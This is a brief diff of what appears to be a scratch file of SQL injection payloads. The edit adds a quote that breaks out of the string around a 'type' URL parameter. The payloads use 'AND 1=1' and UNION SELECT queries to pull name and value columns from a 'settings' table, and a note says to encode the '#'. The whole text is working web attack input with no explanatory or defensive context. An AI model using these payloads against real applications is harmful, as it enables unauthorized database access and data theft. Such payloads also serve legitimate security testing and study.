@@ -1,6 +1,6 @@
-?type=cat AND 1=1#
-?type=cat AND 1=1 UNION SELECT name,value from settings#
-?type=cat AND 1=1 UNION SELECT name,value,null from settings#
+?type=cat' AND 1=1#
+?type=cat' AND 1=1 UNION SELECT name,value from settings#
+?type=cat' AND 1=1 UNION SELECT name,value,null from settings#
 
 (encode # since part of URL)
 
